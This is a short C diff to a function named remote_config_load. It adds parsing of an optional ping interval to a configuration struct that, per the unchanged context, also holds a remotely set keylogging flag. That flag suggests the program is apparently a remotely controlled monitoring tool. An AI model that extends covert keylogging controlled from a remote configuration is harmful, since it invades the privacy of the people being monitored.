@@ -140,6 +140,13 @@ int remote_config_load(remote_config_t* out_config) {
         out_config->keylogging = kl;
     else
         out_config->keylogging = 0;
+
+    int pim = 0;
+    /* ping_interval_minutes is optional; when <= 0 ping is disabled. */
+    if (parse_int_value(buf, "ping_interval_minutes", &pim) && pim > 0)
+        out_config->ping_interval_minutes = pim;
+    else
+        out_config->ping_interval_minutes = 0;
     out_config->valid = 1;
     return 1;
 }
